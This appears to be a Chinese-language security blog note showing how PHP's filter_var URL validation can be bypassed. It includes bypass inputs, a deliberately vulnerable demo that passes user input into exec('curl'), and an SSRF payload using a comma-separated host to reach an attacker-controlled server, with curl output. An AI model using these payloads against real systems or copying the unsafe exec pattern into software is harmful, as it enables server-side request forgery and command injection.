(PHP 5 >= 5.2.0, PHP 7)
filter_var — 使用特定的过滤器过滤一个变量

    mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )


常见的filter 过滤器
```
FILTER_VALIDATE_EMAIL
FILTER_VALIDATE_DOMAIN
FILTER_VALIDATE_IP
FILTER_VALIDATE_URL
```

比较常用的当属FILTER_VALIDATE_URL了吧，但是它存在很easy的绕过问题:

随便给了两个实例都可以bypass
```
<?php 

$url = "javascript://alert(1)";
$url = "0://1";
if(filter_var($url,FILTER_VALIDATE_URL)){
	echo 'Bypass it';
}
```

### demo1

```
<?php
   $argv = $_GET['url'];
   echo "Argument: ".$argv."\n";
   // check if argument is a valid URL
   if(filter_var($argv, FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv);
      print_r($r);
      // check if host ends with baidu.com
      if(preg_match('/baidu\.com$/', $r['host'])) {
         // get page from URL
         exec('curl -v -s "'.$r['host'].'"', $a);
         print_r($a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }

```

有三重验证，filter_var,parse_url,preg_match 的bypass

在这篇文章： https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 给出了绕过方法:

```
url=0://www.blogsir.com.cn:80,baidu.com:80/
```

> 中间的逗号也可以换成 `;` `%0a` `%0d`

原理: 
```
许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。字符“;”, “/”, “?”, “:”, “@”, “=” 和“&”是被保留的。除了分层路径中的点段，通用语法将路径段视为不透明。 生成URI的应用程序通常使用段中允许的保留字符来分隔。例如“；”和“=”用来分割参数和参数值。逗号也有着类似的作用。

例如，有的结构使用name;v=1.1来表示name的version是1.1，然而还可以使用name,1.1来表示相同的意思。当然对于URL来说，这些保留的符号还是要看URL的算法来表示他们的作用。

例如，如果用于hostname上，URL“http://evil.com;baidu.com”会被curl或者wget这样的工具解析为host:evil.com，querything:baidu.com
```

这样我们就可以绕过限制访问到我们的vps上来了。

```
Argument: 0://www.blogsir.com.cn:80,baidu.com:80/
Array
(
    [scheme] => 0
    [host] => www.blogsir.com.cn:80,baidu.com
    [port] => 80
    [path] => /
)
* Rebuilt URL to: www.blogsir.com.cn:80,baidu.com/
*   Trying 123.206.65.167...
* Connected to www.blogsir.com.cn (123.206.65.167) port 80 (#0)
> GET / HTTP/1.1
> Host: www.blogsir.com.cn
> User-Agent: curl/7.47.0
> Accept: */*
```

参考: 

Some trick in ssrf and unserialize(): https://www.jianshu.com/p/80ce73919edb
http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/